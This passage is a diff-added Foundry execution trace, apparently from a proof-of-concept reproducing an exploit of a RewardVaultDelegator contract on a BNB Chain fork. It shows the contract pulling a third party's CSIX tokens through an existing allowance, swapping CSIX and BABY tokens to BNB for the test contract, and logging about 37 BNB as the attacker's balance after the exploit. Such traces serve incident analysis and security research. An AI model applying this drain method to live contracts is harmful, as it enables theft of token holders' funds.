+    │   │   │   ├─ [55] ContractTest::receive{value: 60042431100287365}()
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [24619] CSIX::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x0cbb79c7f71e5880e78c94ad8f30100bc7b7820ec7e96e630618db697302aa5e: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [2553] CSIX::balanceOf(0x2C8EEDA98a84a393e2DB66B013A0cDCA2F3693f2) [staticcall]
+    │   │   │   └─ ← [Return] 17850676325664476204952 [1.785e22]
+    │   │   ├─ [2727] CSIX::allowance(0x2C8EEDA98a84a393e2DB66B013A0cDCA2F3693f2, RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887]) [staticcall]
+    │   │   │   └─ ← [Return] 785446441742217530512929 [7.854e23]
+    │   │   ├─ [30312] CSIX::transferFrom(0x2C8EEDA98a84a393e2DB66B013A0cDCA2F3693f2, RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], 17850676325664476204952 [1.785e22])
+    │   │   │   ├─ [2380] 0x111541df26BeD3BcBEa90463bBB46F89fd95Ec1E::masterAccount() [staticcall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000002c8eeda98a84a393e2db66b013a0cdca2f3693f2
+    │   │   │   ├─ emit Approval(owner: 0x2C8EEDA98a84a393e2DB66B013A0cDCA2F3693f2, spender: RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], value: 767595765416553054307977 [7.675e23])
+    │   │   │   ├─ [380] 0x111541df26BeD3BcBEa90463bBB46F89fd95Ec1E::masterAccount() [staticcall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000002c8eeda98a84a393e2db66b013a0cdca2f3693f2
+    │   │   │   ├─ [2677] 0x111541df26BeD3BcBEa90463bBB46F89fd95Ec1E::extractFee(RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], 17850676325664476204952 [1.785e22]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003c7afe5f5415a3d8f98
+    │   │   │   ├─ emit Transfer(from: 0x2C8EEDA98a84a393e2DB66B013A0cDCA2F3693f2, to: 0x2C8EEDA98a84a393e2DB66B013A0cDCA2F3693f2, value: 0)
+    │   │   │   ├─ emit Transfer(from: 0x2C8EEDA98a84a393e2DB66B013A0cDCA2F3693f2, to: RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], value: 17850676325664476204952 [1.785e22])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xfcde93add1f04273e6b56cdb4bd777efb215f4c3e4d6e9ccc1ca0daa16a40187: 0x000000000000000000000000000000000000000000000037f29679bafefc8b24 → 0x0000000000000000000000000000000000000000000003ffa27c6efc593a1abc
+    │   │   │   │   @ 0xa9737c040f141cc81542a2ea794c053410321951256a617d3ed55cc4efcf12ec: 0x00000000000000000000000000000000000000000000a653230d8af21f0b1621 → 0x00000000000000000000000000000000000000000000a28b732795b0c4cd8689
+    │   │   │   │   @ 0x3450515ee9964d89db3b8d0235a144910d0ebe54516c9687f7560bea1079cbba: 0x0000000000000000000000000000000000000000000003c7afe5f5415a3d8f98 → 0
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [553] CSIX::balanceOf(RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887]) [staticcall]
+    │   │   │   └─ ← [Return] 18882727542566235544252 [1.888e22]
+    │   │   ├─ [108280] Router::swapExactTokensForETHSupportingFeeOnTransferTokens(18882727542566235544252 [1.888e22], 0, [0x04756126F044634C9a0f0E985e60c88a51ACC206, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1697964196 [1.697e9])
+    │   │   │   ├─ [16024] CSIX::transferFrom(RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], 0x990403f188f6B4316B35accA436Bf6b76414656F, 18882727542566235544252 [1.888e22])
+    │   │   │   │   ├─ [380] 0x111541df26BeD3BcBEa90463bBB46F89fd95Ec1E::masterAccount() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000002c8eeda98a84a393e2db66b013a0cdca2f3693f2
+    │   │   │   │   ├─ [380] 0x111541df26BeD3BcBEa90463bBB46F89fd95Ec1E::masterAccount() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000002c8eeda98a84a393e2db66b013a0cdca2f3693f2
+    │   │   │   │   ├─ [2677] 0x111541df26BeD3BcBEa90463bBB46F89fd95Ec1E::extractFee(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 18882727542566235544252 [1.888e22]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003ffa27c6efc593a1abc
+    │   │   │   │   ├─ emit Transfer(from: RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], to: 0x2C8EEDA98a84a393e2DB66B013A0cDCA2F3693f2, value: 0)
+    │   │   │   │   ├─ emit Transfer(from: RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], to: 0x990403f188f6B4316B35accA436Bf6b76414656F, value: 18882727542566235544252 [1.888e22])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x7fbae33a8e690c83b4637803c3f523317ee7c94122470be4540375f75b0a39b3: 0x0000000000000000000000000000000000000000000010ad417fd13916c09fa2 → 0x0000000000000000000000000000000000000000000014ace3fc40356ffaba5e
+    │   │   │   │   │   @ 0xfcde93add1f04273e6b56cdb4bd777efb215f4c3e4d6e9ccc1ca0daa16a40187: 0x0000000000000000000000000000000000000000000003ffa27c6efc593a1abc → 0
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2893] 0x990403f188f6B4316B35accA436Bf6b76414656F::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 78753870171643708481442 [7.875e22], 7428753478134071687 [7.428e18], 1697962937 [1.697e9]
+    │   │   │   ├─ [553] CSIX::balanceOf(0x990403f188f6B4316B35accA436Bf6b76414656F) [staticcall]
+    │   │   │   │   └─ ← [Return] 97636597714209944025694 [9.763e22]
+    │   │   │   ├─ [62361] 0x990403f188f6B4316B35accA436Bf6b76414656F::swap(0, 1433807904783099325 [1.433e18], Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x)
+    │   │   │   │   ├─ [27962] WBNB::transfer(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 1433807904783099325 [1.433e18])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x990403f188f6B4316B35accA436Bf6b76414656F, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 1433807904783099325 [1.433e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0 → 0x00000000000000000000000000000000000000000000000013e5e8b158be65bd
+    │   │   │   │   │   │   @ 0x65f3d0feb8c7bc095c332cd8c4299a3db496959ab2485a3ac0b0967e7a7d30d5: 0x00000000000000000000000000000000000000000000000067183beddc210187 → 0x0000000000000000000000000000000000000000000000005332533c83629bca
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [553] CSIX::balanceOf(0x990403f188f6B4316B35accA436Bf6b76414656F) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 97636597714209944025694 [9.763e22]
+    │   │   │   │   ├─ [534] WBNB::balanceOf(0x990403f188f6B4316B35accA436Bf6b76414656F) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 5994945573350972362 [5.994e18]
+    │   │   │   │   ├─ emit Sync(reserve0: 97636597714209944025694 [9.763e22], reserve1: 5994945573350972362 [5.994e18])
+    │   │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 18882727542566235544252 [1.888e22], amount1In: 0, amount0Out: 0, amount1Out: 1433807904783099325 [1.433e18], to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 10: 0x000000000000000000000000003a553d1c923196ca6bac73849ee8406c138bef → 0x000000000000000000000000003a55670206e0f9ee4738df15bb52e8f0d6581f
+    │   │   │   │   │   @ 9: 0x0000000000000000000000000000000009632c48d62f8b9219ab9acc57923c6f → 0x0000000000000000000000000000000009633289f4c478c03b290ed485ac4b07
+    │   │   │   │   │   @ 8: 0x6534dbb900000000000067183beddc2101870000000010ad417fd13916c09fa2 → 0x6534dcbc0000000000005332533c83629bca0000000014ace3fc40356ffaba5e
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [534] WBNB::balanceOf(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]) [staticcall]
+    │   │   │   │   └─ ← [Return] 1433807904783099325 [1.433e18]
+    │   │   │   ├─ [9223] WBNB::withdraw(1433807904783099325 [1.433e18])
+    │   │   │   │   ├─ [83] Router::fallback{value: 1433807904783099325}()
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ emit Withdrawal(src: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 1433807904783099325 [1.433e18])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0x00000000000000000000000000000000000000000000000013e5e8b158be65bd → 0
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [55] ContractTest::receive{value: 1433807904783099325}()
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [24586] BABY::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x5dd0d100d6ef599f20166740b2e71d0223f85b731eb6539d6e1b9d28f50e794b: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [2487] BABY::balanceOf(RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887]) [staticcall]
+    │   │   │   └─ ← [Return] 3318622570906921282235 [3.318e21]
+    │   │   ├─ [105718] Router::swapExactTokensForETHSupportingFeeOnTransferTokens(3318622570906921282235 [3.318e21], 0, [0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1697964196 [1.697e9])
+    │   │   │   ├─ [13594] BABY::transferFrom(RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], 0xAd1bFa8B34E6F6e63972D47667712f36061D955b, 3318622570906921282235 [3.318e21])
+    │   │   │   │   ├─ emit Transfer(from: RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], to: 0xAd1bFa8B34E6F6e63972D47667712f36061D955b, value: 3318622570906921282235 [3.318e21])
+    │   │   │   │   ├─ emit Approval(owner: RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564036138961437006208357700 [1.157e77])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x90baa12f5501a2c74e4d379a77ae786191ada734f14bf70a076f9df8fe256e42: 0x0000000000000000000000000000000000000000000000b3e723cd6c84a12abb → 0
+    │   │   │   │   │   @ 0x5dd0d100d6ef599f20166740b2e71d0223f85b731eb6539d6e1b9d28f50e794b: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xffffffffffffffffffffffffffffffffffffffffffffff4c18dc32937b5ed544
+    │   │   │   │   │   @ 0x0004637a4a579a51891eca063d65d3f864914baa1337d9207385ba58708f6d10: 0x000000000000000000000000000000000000000000000a124cd5bafdc05473ef → 0x000000000000000000000000000000000000000000000ac633f9886a44f59eaa
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2893] 0xAd1bFa8B34E6F6e63972D47667712f36061D955b::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 47561242758939162211311 [4.756e22], 1632193724015938333 [1.632e18], 1697962828 [1.697e9]
+    │   │   │   ├─ [487] BABY::balanceOf(0xAd1bFa8B34E6F6e63972D47667712f36061D955b) [staticcall]
+    │   │   │   │   └─ ← [Return] 50879865329846083493546 [5.087e22]
+    │   │   │   ├─ [62295] 0xAd1bFa8B34E6F6e63972D47667712f36061D955b::swap(0, 106210472284542274 [1.062e17], Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x)
+    │   │   │   │   ├─ [27962] WBNB::transfer(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 106210472284542274 [1.062e17])
+    │   │   │   │   │   ├─ emit Transfer(from: 0xAd1bFa8B34E6F6e63972D47667712f36061D955b, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 106210472284542274 [1.062e17])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xb38028b81f688831e2dac4ae90cbe11782f0add9a9fc529e3e7505a67fe1c713: 0x00000000000000000000000000000000000000000000000016a6b78b54978b1d → 0x000000000000000000000000000000000000000000000000152d61aeb4a535db
+    │   │   │   │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0 → 0x000000000000000000000000000000000000000000000000017955dc9ff25542
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [487] BABY::balanceOf(0xAd1bFa8B34E6F6e63972D47667712f36061D955b) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 50879865329846083493546 [5.087e22]
+    │   │   │   │   ├─ [534] WBNB::balanceOf(0xAd1bFa8B34E6F6e63972D47667712f36061D955b) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1525983251731396059 [1.525e18]
+    │   │   │   │   ├─ emit Sync(reserve0: 50879865329846083493546 [5.087e22], reserve1: 1525983251731396059 [1.525e18])
+    │   │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 3318622570906921282235 [3.318e21], amount1In: 0, amount0Out: 0, amount1Out: 106210472284542274 [1.062e17], to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 8: 0x6534db4c00000000000016a6b78b54978b1d000000000a124cd5bafdc05473ef → 0x6534dcbc000000000000152d61aeb4a535db000000000ac633f9886a44f59eaa
+    │   │   │   │   │   @ 9: 0x0000000000000000000000000000000094552086a7ec13e3d5c0a038c6676da8 → 0x00000000000000000000000000000000945523c24e18f55a0c883ed9f1cdd948
+    │   │   │   │   │   @ 10: 0x0000000000000000000000000092e0494fa3365cfbde429ef533661accea82e2 → 0x0000000000000000000000000092e0ecef9c45cf36e03d4a23440856583c6552
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [534] WBNB::balanceOf(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]) [staticcall]
+    │   │   │   │   └─ ← [Return] 106210472284542274 [1.062e17]
+    │   │   │   ├─ [9223] WBNB::withdraw(106210472284542274 [1.062e17])
+    │   │   │   │   ├─ [83] Router::fallback{value: 106210472284542274}()
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ emit Withdrawal(src: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 106210472284542274 [1.062e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0x000000000000000000000000000000000000000000000000017955dc9ff25542 → 0
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [55] ContractTest::receive{value: 106210472284542274}()
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ emit log_named_decimal_uint(key: "Attacker BNB balance after exploit", val: 37136665551377188920 [3.713e19], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 34.76s (33.61s CPU time)
+
+Ran 1 test suite in 42.09s (34.76s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
